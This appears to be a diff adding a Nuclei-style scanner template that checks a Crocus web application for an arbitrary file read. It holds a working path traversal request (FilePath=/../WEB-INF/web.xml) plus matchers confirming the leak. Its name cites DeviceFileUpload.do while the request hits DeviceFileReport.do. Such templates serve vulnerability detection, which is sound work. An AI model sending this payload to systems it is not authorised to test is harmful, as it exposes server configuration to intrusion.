@@ -1,0 +1,29 @@
+id: poc-yaml-crocus-devicefileupload-do-anyfile-read
+info:
+  name: Crocus DeviceFileUpload.do Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - raw:
+      - |
+        GET /DeviceFileReport.do?Action=Download&FilePath=/../WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "web-app"
+          - "<display-name><"
+      - type: word
+        part: header
+        words:
+          - "filename=web.xml"
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
